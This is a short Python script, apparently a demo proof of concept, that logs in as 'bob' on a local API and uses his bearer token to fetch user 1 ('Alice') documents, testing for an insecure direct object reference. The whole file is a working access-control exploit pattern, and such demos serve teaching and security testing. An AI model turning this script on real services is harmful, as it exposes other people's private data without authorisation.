import requests
import os

API = os.getenv("API_URL", "http://127.0.0.1:5000")

def login(username):
    r = requests.post(f"{API}/login", json={"username": username}, timeout=5)
    r.raise_for_status()
    return r.json()["access_token"]

def access_docs(token, victim_user_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{API}/users/{victim_user_id}/docs", headers=headers, timeout=5)
    return r

if __name__ == "__main__":
    # demo: bob (user_id=2) tries to access alice (user_id=1)
    token = login("bob")
    print("[*] Bob token:", token)
    print("[*] Attempting to access Alice's docs with Bob's token (IDOR)")
    r = access_docs(token, 1)
    print("[*] Status:", r.status_code)
    print("[*] Response:", r.text)
